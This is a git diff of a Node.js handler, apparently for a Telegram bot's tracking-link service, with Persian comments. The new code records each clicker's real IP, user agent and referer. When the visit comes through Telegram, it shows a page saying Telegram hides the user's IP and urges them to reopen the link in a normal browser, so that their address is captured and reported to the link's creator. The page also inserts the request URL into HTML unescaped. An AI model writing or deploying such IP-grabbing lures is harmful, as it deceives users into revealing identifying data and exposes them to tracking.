@@ -25,28 +25,80 @@ module.exports = async (req, res) => {
         }
         
         const { creatorId } = linkData;
-         const ipSources = {
-        // Cloudflare (اگر استفاده می‌کنید)
-        cfConnectingIp: req.headers['cf-connecting-ip'],
-        
-        // Vercel و پروکسی‌ها
-        xForwardedFor: req.headers['x-forwarded-for'],
-        xRealIp: req.headers['x-real-ip'],
-        
-        // مستقیم
-        remoteAddress: req.connection.remoteAddress,
-        socketRemoteAddress: req.socket.remoteAddress,
-        
-        // سایر
-        trueClientIp: req.headers['true-client-ip'],
-        cfVisitor: req.headers['cf-visitor'],
+             const realUserIP = (
+        req.headers['cf-connecting-ip'] ||          // Cloudflare
+        req.headers['x-forwarded-for']?.split(',')[0].trim() || // پروکسی زنجیره
+        req.headers['x-real-ip'] ||                // نرم افزارهای خاص
+        req.connection.remoteAddress ||            // مستقیم
+        req.socket.remoteAddress ||                // از سوکت
+        'UNKNOWN'
+    ).replace('::ffff:', ''); // حذف IPv6 prefix
+
+    // اطلاعات کامل کاربر
+    const userInfo = {
+        ip: realUserIP,
+        timestamp: new Date().toISOString(),
+        userAgent: req.headers['user-agent'],
+        referer: req.headers.referer || 'direct',
+        query: req.query,
+        // تشخیص تلگرام
+        isTelegram: req.headers['user-agent']?.includes('TelegramBot') || 
+                    req.headers['user-agent']?.includes('Telegram') || false
     };
-    let realIp = ipSources.cfConnectingIp || 
-                 ipSources.xForwardedFor?.split(',')[0] || 
-                 ipSources.xRealIp || 
-                 ipSources.remoteAddress;
-                  console.log('🔍 IP Debug Info:', JSON.stringify(ipSources, null, 2));
-    console.log('🎯 Detected Real IP:', realIp);
+
+    // 🎯 اگر از تلگرام آمده باشد
+    if (userInfo.isTelegram) {
+        console.log('⚠️ کاربر از تلگرام آمده - IP مخفی است:', req.connection.remoteAddress);
+        
+        // صفحه اخطار نمایش بده
+        const warningHtml = `
+        <!DOCTYPE html>
+        <html dir="rtl">
+        <head>
+            <title>⚠️ لطفا از مرورگر معمولی وارد شوید</title>
+            <meta charset="UTF-8">
+            <style>
+                body { font-family: Tahoma; text-align: center; padding: 50px; }
+                .warning { color: #d63031; background: #ffeaa7; padding: 20px; border-radius: 10px; }
+                .steps { text-align: right; margin: 30px; }
+            </style>
+        </head>
+        <body>
+            <div class="warning">
+                <h2>⛔ برای ادامه لطفا از مرورگر معمولی استفاده کنید</h2>
+                <p>تلگرام IP شما را مخفی می‌کند</p>
+            </div>
+            
+            <div class="steps">
+                <h3>📱 راه‌حل:</h3>
+                <p>1. لینک زیر را کپی کنید</p>
+                <p style="background:#eee;padding:10px;font-family:monospace;">
+                    ${req.url}
+                </p>
+                <p>2. آن را در مرورگر معمولی (Chrome, Firefox, Safari) باز کنید</p>
+                <p>3. سپس به تلگرام منتقل خواهید شد</p>
+            </div>
+            
+            <p><a href="#" onclick="copyLink()" style="background:#0984e3;color:white;padding:10px 20px;border-radius:5px;text-decoration:none">
+                📋 کپی لینک
+            </a></p>
+            
+            <script>
+                function copyLink() {
+                    navigator.clipboard.writeText(window.location.href);
+                    alert('لینک کپی شد! حالا در مرورگر معمولی بازش کنید');
+                }
+            </script>
+        </body>
+        </html>
+        `;
+        
+        return res.send(warningHtml);
+    }
+
+    // ✅ کاربر از مرورگر معمولی آمده - IP واقعی را داریم
+    console.log('🎉 IP واقعی کاربر:', realUserIP);
+    console.log('📊 اطلاعات کامل:', JSON.stringify(userInfo, null, 2));
         // const privateUserIP =  req.headers['x-real-ip'];
         // const privateUserIP = req.headers['x-forwarded-for'];
         // const privateUserAgent = req.headers['user-agent'];
@@ -58,7 +110,6 @@ module.exports = async (req, res) => {
         bot.api.sendMessage(
             creatorId, 
             `🔔 اعلان کلیک! شخصی روی لینک شما (${linkId}) کلیک کرد.
-            UserAgent: ${privateUserAgent}
             `
         ).catch(e => console.error("Error sending notification:", e));
         
